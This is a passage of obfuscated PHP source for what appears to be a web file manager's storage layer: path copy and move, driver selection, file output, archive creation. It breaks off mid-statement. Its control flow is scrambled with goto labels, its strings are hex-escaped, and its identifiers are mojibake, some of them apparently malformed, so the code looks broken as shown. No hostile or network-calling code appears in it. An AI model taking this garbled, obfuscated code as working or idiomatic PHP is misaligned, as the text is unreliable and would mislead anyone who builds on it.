bèâ‚â„åÍ; bèâ‚â„åÍ: $bîè“­†×É = self::driverMake($Aõ¤”ˆ±¨); $Dî‹Ä½ËŠ = self::driverMake($Aé˜Çë‰ìá); $C›‚ÍÂß“Ï = $BË¿ØØ·ìç == $F•»‹Œ‡—é[505]; goto D‘Ó£ĞºØ‹; e«²Î‰Èí†: if ($C×Â™ïçÈ) { $B”³èÍ¥›¤ = $C×Â™ïçÈ->getPathOuter($B”³èÍ¥›¤); } return $B”³èÍ¥›¤; goto bôÀ—ÕŠÂ; D‘Ó£ĞºØ‹: $C×Â™ïçÈ = !1; if ($Dî‹Ä½ËŠ->pathParse[$F•»‹Œ‡—é[1002]]) { $Aé˜Çë‰ìá = $Dî‹Ä½ËŠ->pathParse[$F•»‹Œ‡—é[1002]]; $C×Â™ïçÈ = $Dî‹Ä½ËŠ; $Dî‹Ä½ËŠ = self::driverMake($Aé˜Çë‰ìá); } self::check($bîè“­†×É, $Aõ¤”ˆ±¨, $Dî‹Ä½ËŠ, $Aé˜Çë‰ìá); goto fÑœƒÓçÙ; fÑœƒÓçÙ: Hook::trigger($F•»‹Œ‡—é[72], $bîè“­†×É, $Aõ¤”ˆ±¨, $Dî‹Ä½ËŠ, $Aé˜Çë‰ìá); $cÜ“Â…ò¸ = self::driverIsSame($bîè“­†×É, $Dî‹Ä½ËŠ); if ($cÜ“Â…ò¸) { if ($BË¿ØØ·ìç == $F•»‹Œ‡—é[505] && !method_exists($Dî‹Ä½ËŠ, $F•»‹Œ‡—é[1003]) && trim($Aé˜Çë‰ìá, $F•»‹Œ‡—é[8]) == trim($Dî‹Ä½ËŠ->pathFather($Aõ¤”ˆ±¨), $F•»‹Œ‡—é[8])) { return $Dî‹Ä½ËŠ->getPathOuter($Aõ¤”ˆ±¨); } if (method_exists($Dî‹Ä½ËŠ, $BË¿ØØ·ìç)) { return $Dî‹Ä½ËŠ->{$BË¿ØØ·ìç}($Aõ¤”ˆ±¨, $Aé˜Çë‰ìá, $bÄä¥†ğ²ë); } } goto Fï÷¹Ë¸ª§; Fï÷¹Ë¸ª§: $f ­Øà‰©ì = $bîè“­†×É->isFile($Aõ¤”ˆ±¨); if (!$f ­Øà‰©ì && $Dî‹Ä½ËŠ->getType() == $F•»‹Œ‡—é[700] && $bîè“­†×É->getType() == $F•»‹Œ‡—é[102]) { $B”³èÍ¥›¤ = $Dî‹Ä½ËŠ->copyFolderFromIO($bîè“­†×É, $Aõ¤”ˆ±¨, $Aé˜Çë‰ìá, $bÄä¥†ğ²ë, $C›‚ÍÂß“Ï, $Eß´‘Š¼†); } else { $B”³èÍ¥›¤ = self::copyPath($bîè“­†×É, $Aõ¤”ˆ±¨, $Dî‹Ä½ËŠ, $Aé˜Çë‰ìá, $bÄä¥†ğ²ë, $C›‚ÍÂß“Ï, $f ­Øà‰©ì, $Eß´‘Š¼†); } if ($B”³èÍ¥›¤ && $C›‚ÍÂß“Ï) { $bîè“­†×É->remove($Aõ¤”ˆ±¨); } goto e«²Î‰Èí†; bôÀ—ÕŠÂ: } private static function check($A‚ª®ÓË˜, $bàÆº•†ß, $D×ÀÃè–ÖÇ, &$EºäùÚĞá) { $DäùÆÏÏÓ =& $_SERVER[‡’¶øåüç˜]; if (self::driverIsSame($A‚ª®ÓË˜, $D×ÀÃè–ÖÇ) && $A‚ª®ÓË˜->isFolder($bàÆº•†ß) && $A‚ª®ÓË˜->isParentOf($bàÆº•†ß, $EºäùÚĞá)) { show_json(LNG($DäùÆÏÏÓ[1004]), !1); } if (!$A‚ª®ÓË˜->exist($bàÆº•†ß)) { show_json(LNG($DäùÆÏÏÓ[101]), !1); } } private static function copyPath($bâô´ÜÆ¥Ä, $CøŠ··à„Ä, $fĞÛöÑˆÁ“, $Fİ¶„³ê»À, $Aè—”¬‰Çƒ, $EÀ‰Š³ÜÓ , $FˆÁÓãµÅ‘, $C·÷ÒÁ¿ ô = false) { goto e” Š“£; eäÉ™—‘œ¸: if ($FˆÁÓãµÅ‘) { return self::copyFile($bâô´ÜÆ¥Ä, $CøŠ··à„Ä, $fĞÛöÑˆÁ“, $Fİ¶„³ê»À, $d§†Œà†², $EÀ‰Š³ÜÓ ); } if ($Aè—”¬‰Çƒ == REPEAT_RENAME_FOLDER) { $Aè—”¬‰Çƒ = !1; } $E«‚ŠÀŒÁ = rtrim($Fİ¶„³ê»À, $Cò§…Õ„ÙŒ[8]) . $Cò§…Õ„ÙŒ[8] . $d§†Œà†²; goto F¹áÆÉ¸Ñ®; c´·îÛÏ†…: $CÁ ñø“ = array_merge($C±ÔÃ¶“¨¤[$Cò§…Õ„ÙŒ[73]], $C±ÔÃ¶“¨¤[$Cò§…Õ„ÙŒ[74]]); foreach ($CÁ ñø“ as $F‚™ïéÎáº) { $B°â÷ªÙ = $F‚™ïéÎáº[$Cò§…Õ„ÙŒ[29]] == $Cò§…Õ„ÙŒ[171]; $CøŠ··à„Ä = $bâô´ÜÆ¥Ä->getPathInner($F‚™ïéÎáº[$Cò§…Õ„ÙŒ[75]]); $dğï‹äğ°¯ = self::copyPath($bâô´ÜÆ¥Ä, $CøŠ··à„Ä, $fĞÛöÑˆÁ“, $Fİ¶„³ê»À, $Aè—”¬‰Çƒ, $EÀ‰Š³ÜÓ , $B°â÷ªÙ); if (!$dğï‹äğ°¯) { write_log($Cò§…Õ„ÙŒ[1005] . $CøŠ··à„Ä . $Cò§…Õ„ÙŒ[1006] . $Fİ¶„³ê»À, $Cò§…Õ„ÙŒ[1007]); } } return $D…ÎÀœÄ§™; goto E¬ÙÌğ›Çø; e” Š“£: $Cò§…Õ„ÙŒ =& $_SERVER[‡’¶øåüç˜]; $d§†Œà†² = $C·÷ÒÁ¿ ô ? $C·÷ÒÁ¿ ô : $bâô´ÜÆ¥Ä->getPathName($bâô´ÜÆ¥Ä->pathThis($CøŠ··à„Ä)); if ($Aè—”¬‰Çƒ) { $Fã›Ÿ‚¸¶ = $fĞÛöÑˆÁ“->fileNameExist($Fİ¶„³ê»À, $d§†Œà†²); $d§†Œà†² = $fĞÛöÑˆÁ“->fileNameAuto($Fİ¶„³ê»À, $d§†Œà†², $Aè—”¬‰Çƒ, !$FˆÁÓãµÅ‘); $Aè—”¬‰Çƒ = $Fã›Ÿ‚¸¶ ? $Aè—”¬‰Çƒ : !1; } goto eäÉ™—‘œ¸; F¹áÆÉ¸Ñ®: $D…ÎÀœÄ§™ = $fĞÛöÑˆÁ“->mkdir($fĞÛöÑˆÁ“->getPath($E«‚ŠÀŒÁ)); $Fİ¶„³ê»À = $fĞÛöÑˆÁ“->getPathInner($D…ÎÀœÄ§™); $C±ÔÃ¶“¨¤ = $bâô´ÜÆ¥Ä->listPath($CøŠ··à„Ä, !0); goto c´·îÛÏ†…; E¬ÙÌğ›Çø: } private static function copyFile($C«ŒÓÂ«™ï, $aÖ„âÏĞ™¢, $FĞ‡¿òâÕ¬, $Bİ‡Å½°¨­, $có­İåíÑ, $d¥ƒë­´Ÿç) { goto ağÆ¦ÅæÙí; F¾ØÔ§™é‘: mk_dir($e‘é„‹ïŠä); $b‘¤©¦„Ú = $e‘é„‹ïŠä . $f°ºµÑšƒ; $b‘¤©¦„Ú = $C«ŒÓÂ«™ï->download($aÖ„âÏĞ™¢, $b‘¤©¦„Ú); goto Cç ãÁ•èí; fˆƒóŒœÌˆ: Hook::trigger($C¾ºå«ËÁ[1009], $C«ŒÓÂ«™ï, $aÖ„âÏĞ™¢, $FĞ‡¿òâÕ¬, $Bİ‡Å½°¨­, $có­İåíÑ, $f°ºµÑšƒ); if (self::driverIsSame($C«ŒÓÂ«™ï, $FĞ‡¿òâÕ¬)) { if ($d¥ƒë­´Ÿç) { $fŠÛñâ…… = $FĞ‡¿òâÕ¬->moveFile($aÖ„âÏĞ™¢, $Bİ‡Å½°¨­); } else { $fŠÛñâ…… = $FĞ‡¿òâÕ¬->copyFile($aÖ„âÏĞ™¢, $Bİ‡Å½°¨­); } Hook::trigger($C¾ºå«ËÁ[1010], $C«ŒÓÂ«™ï, $aÖ„âÏĞ™¢, $FĞ‡¿òâÕ¬, $Bİ‡Å½°¨­, $có­İåíÑ, $fŠÛñâ……); return $fŠÛñâ……; } $e‘é„‹ïŠä = TEMP_FILES; goto F¾ØÔ§™é‘; D«§¡­à¦°: Hook::trigger($C¾ºå«ËÁ[1010], $C«ŒÓÂ«™ï, $aÖ„âÏĞ™¢, $FĞ‡¿òâÕ¬, $Bİ‡Å½°¨­, $có­İåíÑ, $fŠÛñâ……); return $fŠÛñâ……; goto b¡„å–Ã“ğ; Cç ãÁ•èí: $b‘¤©¦„Ú = $C«ŒÓÂ«™ï->iconvApp($b‘¤©¦„Ú); $fŠÛñâ…… = $FĞ‡¿òâÕ¬->upload($Bİ‡Å½°¨­, $b‘¤©¦„Ú, $d¥ƒë­´Ÿç); self::remove($e‘é„‹ïŠä . $f°ºµÑšƒ); goto D«§¡­à¦°; ağÆ¦ÅæÙí: $C¾ºå«ËÁ =& $_SERVER[‡’¶øåüç˜]; $Bİ‡Å½°¨­ = $FĞ‡¿òâÕ¬->getPath(rtrim($Bİ‡Å½°¨­, $C¾ºå«ËÁ[8]) . $C¾ºå«ËÁ[8] . $có­İåíÑ); $f°ºµÑšƒ = $C¾ºå«ËÁ[1008] . time() . rand_string(5); goto fˆƒóŒœÌˆ; b¡„å–Ã“ğ: } public static function pathFather($DÖãâÈ¦Ò—) { $e§ÂíÊµ« = IO::init($DÖãâÈ¦Ò—); $A ·áÓµ… = $e§ÂíÊµ«->pathFather($e§ÂíÊµ«->path); return $e§ÂíÊµ«->getPathOuter($A ·áÓµ…); } public static function fileOut($DÊ¨·ÏÙ«, $aåĞ”Ùğ†˜ = false, $f”Ç‘ä³µ = false, $aîõ¥ÉÛ÷ = '') { $CØ“™ÂÓ‹º = self::driverMake($DÊ¨·ÏÙ«); if ($CØ“™ÂÓ‹º->isFileOutServer()) { return $CØ“™ÂÓ‹º->fileOutServer($DÊ¨·ÏÙ«, $aåĞ”Ùğ†˜, $f”Ç‘ä³µ, $aîõ¥ÉÛ÷); } return $CØ“™ÂÓ‹º->fileOut($DÊ¨·ÏÙ«, $aåĞ”Ùğ†˜, $f”Ç‘ä³µ, $aîõ¥ÉÛ÷); } public static function fileOutImage($A„â±Ù´å«, $d¨¿«öå = 250) { $d‡ÃŠ†Ù¹ = array(250, 600, 1200, 3000, 5000); for ($BğÏõõóÙ = 0; $BğÏõõóÙ < count($d‡ÃŠ†Ù¹); $BğÏõõóÙ++) { if ($BğÏõõóÙ == 0 && $d¨¿«öå <= $d‡ÃŠ†Ù¹[$BğÏõõóÙ]) { $d¨¿«öå = $d‡ÃŠ†Ù¹[$BğÏõõóÙ]; break; } else { if ($d¨¿«öå > $d‡ÃŠ†Ù¹[$BğÏõõóÙ - 1] && $d¨¿«öå <= $d‡ÃŠ†Ù¹[$BğÏõõóÙ]) { $d¨¿«öå = $d‡ÃŠ†Ù¹[$BğÏõõóÙ]; break; } else { if ($BğÏõõóÙ == count($d‡ÃŠ†Ù¹) - 1 && $d¨¿«öå > $d‡ÃŠ†Ù¹[$BğÏõõóÙ]) { $d¨¿«öå = $d‡ÃŠ†Ù¹[$BğÏõõóÙ]; break; } } } } $C¿ÅÉõªÜ = self::driverMake($A„â±Ù´å«); if ($C¿ÅÉõªÜ->isFileOutServer()) { return $C¿ÅÉõªÜ->fileOutImageServer($A„â±Ù´å«, $d¨¿«öå); } return $C¿ÅÉõªÜ->fileOutImage($A„â±Ù´å«, $d¨¿«öå); } private static function driverIsSame($dÑÉˆ‚†Ê¾, $fÜÚŒ…ÄŸó) { goto AßÎ•°Î·ó; BÂ½¹òôŞæ: if ($dÑÉˆ‚†Ê¾->pathDriver == $fÜÚŒ…ÄŸó->pathDriver) { return !0; } return !1; goto Fİ¬„Çè¡²; AßÎ•°Î·ó: $D‹Ì‹à»·Ğ =& $_SERVER[‡’¶øåüç˜]; $FøéŠ§Ã†Ê = $dÑÉˆ‚†Ê¾->getType(); $E£•ˆ»¯Ä = $fÜÚŒ…ÄŸó->getType(); goto ašêùà½É¿; ašêùà½É¿: if ($FøéŠ§Ã†Ê != $E£•ˆ»¯Ä) { return !1; } if ($FøéŠ§Ã†Ê == $D‹Ì‹à»·Ğ[700]) { return !0; } if ($FøéŠ§Ã†Ê == $D‹Ì‹à»·Ğ[102]) { return !0; } goto BÂ½¹òôŞæ; Fİ¬„Çè¡²: } public static function copyUpdate($B²¹Ç ùî, $e‡¸›İ“›¨) { goto C‰ç­çµáâ; dï¶òïóÏ•: $E˜ˆ¾¨×Ñ = array(); foreach ($Aà¼«†Ÿæ› as $eãîìƒ‡ó‘ => $cÒ¯ÑÙãğ) { if (isset($aóøĞçÎäÈ[$eãîìƒ‡ó‘])) { if ($cÒ¯ÑÙãğ[$C‹ñë¾Ñ¦ğ[76]] == 1) { continue; } if ($aóøĞçÎäÈ[$eãîìƒ‡ó‘][$C‹ñë¾Ñ¦ğ[77]] == $cÒ¯ÑÙãğ[$C‹ñë¾Ñ¦ğ[77]]) { continue; } } if ($cÒ¯ÑÙãğ[$C‹ñë¾Ñ¦ğ[76]] == 1) { $E˜ˆ¾¨×Ñ[] = $e‡¸›İ“›¨ . $C‹ñë¾Ñ¦ğ[8] . $eãîìƒ‡ó‘; continue; } $B‚£Ÿ¬Ø = strstr(trim($eãîìƒ‡ó‘, $C‹ñë¾Ñ¦ğ[8]), $C‹ñë¾Ñ¦ğ[8]) ? get_path_father($eãîìƒ‡ó‘) : $C‹ñë¾Ñ¦ğ[33]; $F±¢‰·„÷Ù[] = array($C‹ñë¾Ñ¦ğ[1011] => $cÒ¯ÑÙãğ[$C‹ñë¾Ñ¦ğ[75]], $C‹ñë¾Ñ¦ğ[1012] => rtrim($e‡¸›İ“›¨, $C‹ñë¾Ñ¦ğ[8]) . $C‹ñë¾Ñ¦ğ[8] . $B‚£Ÿ¬Ø, $C‹ñë¾Ñ¦ğ[1013] => $cÒ¯ÑÙãğ); } $cë®Ô‹‡Ì = array($C‹ñë¾Ñ¦ğ[171] => $F±¢‰·„÷Ù, $C‹ñë¾Ñ¦ğ[76] => $E˜ˆ¾¨×Ñ); goto f«›Â¤ËÊÑ; C‰ç­çµáâ: $C‹ñë¾Ñ¦ğ =& $_SERVER[‡’¶øåüç˜]; if (!IO::exist($B²¹Ç ùî)) { return !1; } if (!IO::exist($e‡¸›İ“›¨)) { IO::mkdir($e‡¸›İ“›¨); } goto fÚÚ å’ïê; f«›Â¤ËÊÑ: Hook::trigger($C‹ñë¾Ñ¦ğ[1014], $B²¹Ç ùî, $e‡¸›İ“›¨, $cë®Ô‹‡Ì); foreach ($E˜ˆ¾¨×Ñ as $cÒ¯ÑÙãğ) { IO::mkdir($cÒ¯ÑÙãğ); } foreach ($F±¢‰·„÷Ù as $cÒ¯ÑÙãğ) { IO::copy($cÒ¯ÑÙãğ[$C‹ñë¾Ñ¦ğ[1011]], $cÒ¯ÑÙãğ[$C‹ñë¾Ñ¦ğ[1012]], REPEAT_REPLACE); } goto cù¡Ê‡±ôº; fÚÚ å’ïê: $Aà¼«†Ÿæ› = self::_listAll($B²¹Ç ùî); $aóøĞçÎäÈ = self::_listAll($e‡¸›İ“›¨); $F±¢‰·„÷Ù = array(); goto dï¶òïóÏ•; cù¡Ê‡±ôº: } private static function _listAll($Dáåè¿¸Åõ) { $EŠÌßğš˜ã =& $_SERVER[‡’¶øåüç˜]; $Dáåè¿¸Åõ = KodIO::clear($Dáåè¿¸Åõ); $C·ù·Î…‡ï = IO::listAll($Dáåè¿¸Åõ); foreach ($C·ù·Î…‡ï as &$F¿ŠğêÃÂí) { $B·Œ®ô­’ƒ = substr($F¿ŠğêÃÂí[$EŠÌßğš˜ã[75]], strlen($Dáåè¿¸Åõ)); $F¿ŠğêÃÂí[$EŠÌßğš˜ã[1015]] = trim($B·Œ®ô­’ƒ, $EŠÌßğš˜ã[8]); } unset($F¿ŠğêÃÂí); return array_to_keyvalue($C·ù·Î…‡ï, $EŠÌßğš˜ã[1015]); } public static function fileSubstr($a£—Ü÷ˆñ, $Dá‘ÆÎÃæ¼, $B‘ìç²ñ“£ = false) { goto C¨²¸°ÈĞ…; aÔ¤¾é”„ƒ: if (!$Aİ´îÖÏÊä && $B‘ìç²ñ“£ && isset($GLOBALS[$b½–µÔ…µæ[1018]])) { throw new Exception($GLOBALS[$b½–µÔ…µæ[1018]][$b½–µÔ…µæ[1019]]); } return $Aİ´îÖÏÊä; goto F‡àÅ·µ£Ì; D¨¼ó•¯: $f©¶Ÿ™Î…½ = $Dá‘ÆÎÃæ¼; $cÉ›¡¼š‚ = $B‘ìç²ñ“£; if ($Dá‘ÆÎÃæ¼ < 0) { $Dá‘ÆÎÃæ¼ = $B‹©ËÀµ» + $Dá‘ÆÎÃæ¼; } goto D²Ÿˆ±×£ƒ; b§ßì”­È: if ($B‘ìç²ñ“£ <= 0) { return $b½–µÔ…µæ[33]; } if ($Dá‘ÆÎÃæ¼ < 0 || $Dá‘ÆÎÃæ¼ >= $B‹©ËÀµ» || $B‘ìç²ñ“£ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\145\x52\145\x61\x64\40\145\162\162\x6f\162\x21\40\163\164\x61\162\x74\75{$Dá‘ÆÎÃæ¼}\73\x6c\x65\x6e\x67\x74\x68\x3d{$B‘ìç²ñ“£}\x3b\x20\163\151\172\x65\x3d{$B‹©ËÀµ»}\x3b"); } $Aİ´îÖÏÊä = $dõä³¬ïÔ->fileSubstr($a£—Ü÷ˆñ, $Dá‘ÆÎÃæ¼, $B‘ìç²ñ“£); goto aÔ¤¾é”„ƒ; C¨²¸°ÈĞ…: $b½–µÔ…µæ =& $_SERVER[‡’¶øåüç˜]; $dõä³¬ïÔ = self::driverMake($a£—Ü÷ˆñ); $B‹©ËÀµ» = $dõä³¬ïÔ->size($a£—Ü÷ˆñ); goto D¨¼ó•¯; D²Ÿˆ±×£ƒ: if ($B‘ìç²ñ“£ === !1) { $B‘ìç²ñ“£ = $B‹©ËÀµ» - $Dá‘ÆÎÃæ¼; } if ($Dá‘ÆÎÃæ¼ + $B‘ìç²ñ“£ > $B‹©ËÀµ») { $B‘ìç²ñ“£ = $B‹©ËÀµ» - $Dá‘ÆÎÃæ¼; } if (!$B‹©ËÀµ» && $dõä³¬ïÔ->getType() == $b½–µÔ…µæ[102] && !$dõä³¬ïÔ->exist($a£—Ü÷ˆñ)) { throw new Exception($b½–µÔ…µæ[1016] . LNG($b½–µÔ…µæ[1017])); } goto b§ßì”­È; F‡àÅ·µ£Ì: } private static function driverMake(&$f¡‘Â«”ÓÂ) { goto f’‹‡×ì¥; f’‹‡×ì¥: $f˜ÓÎùÌ… =& $_SERVER[‡’¶øåüç˜]; $bÍ…”ÀÁÄ› = KodIO::parse($f¡‘Â«”ÓÂ); if (!self::$driverListSystem) { $F‹õˆ³—©ª = Model($f˜ÓÎùÌ…[709])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($F‹õˆ³—©ª, $f˜ÓÎùÌ…[371]); } goto DŠê¶ÆŒĞ·; DŠê¶ÆŒĞ·: if ($bÍ…”ÀÁÄ›[$f˜ÓÎùÌ…[29]] == KodIO::KOD_IO && !self::$driverListSystem[$bÍ…”ÀÁÄ›[$f˜ÓÎùÌ…[371]]]) { return !1; } $f¡‘Â«”ÓÂ = $bÍ…”ÀÁÄ›[$f˜ÓÎùÌ…[1020]]; $Aù¯œŠ†Ÿ† = self::driverGet($bÍ…”ÀÁÄ›, $f¡‘Â«”ÓÂ); goto F’ºµ Õªê; F’ºµ Õªê: return $Aù¯œŠ†Ÿ†; goto A’ÍØÅ…øÄ; A’ÍØÅ…øÄ: } private static function driverGet($AË¦œ“Õ”â, &$B«‘¿®ø) { goto bèÒ«ÌˆÉÚ; eÂ´‘Ò¤ó: if (isset($A•‡’Éƒ¹Û[$cÛ—´¨­â…[6]][$cÛ—´¨­â…[1032]])) { $eç¤ÎŠ½ší->pathBase = rtrim($A•‡’Éƒ¹Û[$cÛ—´¨­â…[6]][$cÛ—´¨­â…[1032]], $cÛ—´¨­â…[8]) . $cÛ—´¨­â…[8]; $B«‘¿®ø = $eç¤ÎŠ½ší->pathBase . ltrim($B«‘¿®ø, $cÛ—´¨­â…[8]); } $B«‘¿®ø = $eç¤ÎŠ½ší->getPath($B«‘¿®ø); if (isset($AË¦œ“Õ”â[$cÛ—´¨­â…[1002]])) { $B«‘¿®ø = $AË¦œ“Õ”â[$cÛ—´¨­â…[1002]]; } goto Bââé·œÇâ; b¤‡µœë‹¦: switch ($AË¦œ“Õ”â[$cÛ—´¨­â…[29]]) { case KodIO::KOD_IO: $A•‡’Éƒ¹Û = self::$driverListSystem[$eëÒÁ¶­£¦]; break; case KodIO::KOD_SOURCE: $B«‘¿®ø = $eëÒÁ¶­£¦ . $B«‘¿®ø; $A•‡’Éƒ¹Û = array($cÛ—´¨­â…[1022] => $cÛ—´¨­â…[1023], $cÛ—´¨­â…[6] => $AË¦œ“Õ”â); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $D±§Êò­³™ = $GLOBALS[$cÛ—´¨­â…[1024]]; self::$driverListUser = array_to_keyvalue($D±§Êò­³™, $cÛ—´¨­â…[371]); } $A•‡’Éƒ¹Û = self::$driverListUser[$eëÒÁ¶­£¦]; break; case KodIO::KOD_SHARE_LINK: $A•‡’Éƒ¹Û = array($cÛ—´¨­â…[1022] => $cÛ—´¨­â…[1025], $cÛ—´¨­â…[6] => $AË¦œ“Õ”â); $Báôê‹Òº– = Action($cÛ—´¨­â…[1026])->sharePathInfo($AË¦œ“Õ”â[$cÛ—´¨­â…[75]]); $B«‘¿®ø = $Báôê‹Òº–[$cÛ—´¨­â…[381]]; if (!$Báôê‹Òº–[$cÛ—´¨­â…[381]]) { $Cƒƒ³¦¿¶® = Model($cÛ—´¨­â…[548])->getInfo($Báôê‹Òº–[$cÛ—´¨­â…[452]]); $B«‘¿®ø = KodIO::clear($Cƒƒ³¦¿¶®[$cÛ—´¨­â…[1027]] . $AË¦œ“Õ”â[$cÛ—´¨­â…[1020]]); $AË¦œ“Õ”â[$cÛ—´¨­â…[450]] = $Cƒƒ³¦¿¶®; $AË¦œ“Õ”â[$cÛ—´¨­â…[1002]] = $B«‘¿®ø; $A•‡’Éƒ¹Û = array($cÛ—´¨­â…[1022] => $cÛ—´¨­â…[1028], $cÛ—´¨­â…[6] => $AË¦œ“Õ”â); } break; case KodIO::KOD_SHARE_ITEM: $A•‡’Éƒ¹Û = array($cÛ—´¨­â…[1022] => $cÛ—´¨­â…[1029], $cÛ—´¨­â…[6] => $AË¦œ“Õ”â); $Cƒƒ³¦¿¶® = Model($cÛ—´¨­â…[548])->getInfo($AË¦œ“Õ”â[$cÛ—´¨­â…[371]]); if ($Cƒƒ³¦¿¶®[$cÛ—´¨­â…[381]] == $cÛ—´¨­â…[481]) { $B«‘¿®ø = KodIO::clear($Cƒƒ³¦¿¶®[$cÛ—´¨­â…[1027]] . $AË¦œ“Õ”â[$cÛ—´¨­â…[1020]]); $AË¦œ“Õ”â[$cÛ—´¨­â…[450]] = $Cƒƒ³¦¿¶®; $AË¦œ“Õ”â[$cÛ—´¨­â…[1002]] = $B«‘¿®ø; $A•‡’Éƒ¹Û = array($cÛ—´¨­â…[1022] => $cÛ—´¨­â…[1030], $cÛ—´¨­â…[6] => $AË¦œ“Õ”â); } else { if (!$B«‘¿®ø) { $B«‘¿®ø = $Cƒƒ³¦¿¶®[$cÛ—´¨­â…[381]]; } } break; default: $B«‘¿®ø = $AË¦œ“Õ”â[$cÛ—´¨­â…[75]]; $A•‡’Éƒ¹Û = array($cÛ—´¨­â…[1022] => $cÛ—´¨­â…[1031]); break; } $dÆø˜ØÏóÑ = $AË¦œ“Õ”â[$cÛ—´¨­â…[75]]; if (!isset(self::$driverCache[$dÆø˜ØÏóÑ])) { $Cï¼òˆ…ÑÆ = strtolower($A•‡’Éƒ¹Û[$cÛ—´¨­â…[90]]); $eâÒÖÙ»°Ï = $GLOBALS[$cÛ—´¨­â…[6]][$cÛ—´¨­â…[84]][$cÛ—´¨­â…[759]]; $BÄÛÈ•À¹µ = $cÛ—´¨­â…[71] . (isset($eâÒÖÙ»°Ï[$Cï¼òˆ…ÑÆ]) ? $eâÒÖÙ»°Ï[$Cï¼òˆ…ÑÆ] : ucfirst($Cï¼òˆ…ÑÆ)); if (!class_exists($BÄÛÈ•À¹µ)) { show_json("{$BÄÛÈ•À¹µ}\x20\x6e\157\x74\40\x65\170\x69\163\x74\163\x21", !1); } $cù¡ïÕÚñƒ = isset($A•‡’Éƒ¹Û[$cÛ—´¨­â…[6]]) ? $A•‡’Éƒ¹Û[$cÛ—´¨­â…[6]] : !1; self::$driverCache[$dÆø˜ØÏóÑ] = new $BÄÛÈ•À¹µ($cù¡ïÕÚñƒ); } goto b¯§‹°; Bââé·œÇâ: $eç¤ÎŠ½ší->path = $B«‘¿®ø; return $eç¤ÎŠ½ší; goto Aî÷…ã„„; bèÒ«ÌˆÉÚ: $cÛ—´¨­â… =& $_SERVER[‡’¶øåüç˜]; $c´æÄÉ¯Ø› = $AË¦œ“Õ”â[$cÛ—´¨­â…[1021]]; $eëÒÁ¶­£¦ = $AË¦œ“Õ”â[$cÛ—´¨­â…[371]]; goto b¤‡µœë‹¦; b¯§‹°: $eç¤ÎŠ½ší = self::$driverCache[$dÆø˜ØÏóÑ]; $eç¤ÎŠ½ší->pathDriver = $c´æÄÉ¯Ø›; $eç¤ÎŠ½ší->pathBase = $cÛ—´¨­â…[33]; goto eÂ´‘Ò¤ó; Aî÷…ã„„: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $fâ“Ãà…; if (!$fâ“Ãà…) { $B¶ñ·ö‡¦• = IO::init($_SERVER[‡’¶øåüç˜][8]); } return $B¶ñ·ö‡¦•; } private static function iconvSystem($F¼ª‚Æê°©) { return self::local()->iconvSystem($F¼ª‚Æê°©); } private static function iconvApp($C´µƒ™Şëö) { return self::local()->iconvApp($C´µƒ™Şëö); } public static function zip($EÓ¬óœäîá, $B¼×Ù‚Ù® = "\172\151\x70", $f±¨‰ÑÕÒŠ = '', $bÉöÑàØ = REPEAT_RENAME) { goto cÚŸ‡£„Ò‘; Eà›‹´‰ˆÕ: $eƒ´¾ÈÊè = !1; if (!$f±¨‰ÑÕÒŠ && $f¡‚ƒ°é­¿->getType() == $aÒ„â³¢ÂÊ[102]) { $Cä•©‘àÃÃ = self::zipFileList($EÓ¬óœäîá); } else { $eƒ´¾ÈÊè = $f±¨‰ÑÕÒŠ ? $f±¨‰ÑÕÒŠ : TEMP_FILES . $aÒ„â³¢ÂÊ[1033] . time() . rand_string(8) . $aÒ„â³¢ÂÊ[8]; mk_dir($eƒ´¾ÈÊè); $Cä•©‘àÃÃ = self::zipFileList($EÓ¬óœäîá, $eƒ´¾ÈÊè); } $cÈ±¹İ£¾´ = $eÚâ•¹«¤[$aÒ„â³¢ÂÊ[28]]; goto a©æ´ÄƒÕ; d±Àíø¹é: $e‘×­ù ¾¿ = $E´¨Ôƒ£© . $cÈ±¹İ£¾´ . $aÒ„â³¢ÂÊ[91] . $B¼×Ù‚Ù®; $e‘×­ù ¾¿ = get_filename_auto($e‘×­ù ¾¿, $aÒ„â³¢ÂÊ[33], $bÉöÑàØ); $f‘Ö°°¼©ï = self::iconvSystem($e‘×­ù ¾¿); goto fßª˜÷¨†; cÚŸ‡£„Ò‘: $aÒ„â³¢ÂÊ =& $_SERVER[‡’¶øåüç˜]; $f¡‚ƒ°é­¿ = self::init($EÓ¬óœäîá[0][$aÒ„â³¢ÂÊ[75]]); $eÚâ•¹«¤ = self::info($EÓ¬óœäîá[0][$aÒ„â³¢ÂÊ[75]]); goto Eà›‹´‰ˆÕ; A¸ÁÖò×: if ($f±¨‰ÑÕÒŠ || !$eƒ´¾ÈÊè) { if ($eƒ´¾ÈÊè && strstr($eƒ´¾ÈÊè, TEMP_FILES)) { $F•·øÀ”¶å = $Cä•©‘àÃÃ = array(); recursion_dir($E´¨Ôƒ£©, $F•·øÀ”¶å, $Cä•©‘àÃÃ, 0); foreach ($F•·øÀ”¶å as $E›Ë±©Õ¨) { del_dir($E›Ë±©Õ¨); } foreach ($Cä•©‘àÃÃ as $B«Ã—£ˆ‹Ô) { if ($B«Ã—£ˆ‹Ô == $f‘Ö°°¼©ï) { continue; } del_file($B«Ã—£ˆ‹Ô); } } return $e‘×­ù ¾¿; } $E²öˆÑ‡ö‚ = self::pathFather($eÚâ•¹«¤[$aÒ„â³¢ÂÊ[75]]); $Dõ¤–ƒª×˜ = self::move($e‘×­ù ¾¿, $E²öˆÑ‡ö‚, $bÉöÑàØ); goto Aƒİˆ†Ÿ¿×; fßª˜÷¨†: foreach ($Cä•©‘àÃÃ as $cóİ¡·Õ¬ => $eå¿Ş¨Ìé) { $Cä•©‘àÃÃ[$cóİ¡·Õ¬] = self::iconvSystem($eå¿Ş¨Ìé); } KodArchive::create($f‘Ö°°¼©ï, $Cä•©‘àÃÃ); if (!IO::exist($e‘×­ù ¾¿)) { if ($eƒ´¾ÈÊè) { del_dir($eƒ´¾ÈÊè); } show_json(LNG($aÒ„â³¢ÂÊ[1035]), !1); } goto A¸ÁÖò×; a©æ´ÄƒÕ: if (count($Cä•©‘àÃÃ) > 1) { $f‹×Óèñ˜© = IO::info(IO::pathFather($eÚâ•¹«¤[$aÒ„â³¢ÂÊ[75]])); $cÈ±¹İ£¾´ = $f‹×Óèñ˜©[$aÒ„â³¢ÂÊ[28]]; } $E´¨Ôƒ£© = $eƒ´¾ÈÊè; if (!$E´¨Ôƒ£©) { $E´¨Ôƒ£© = 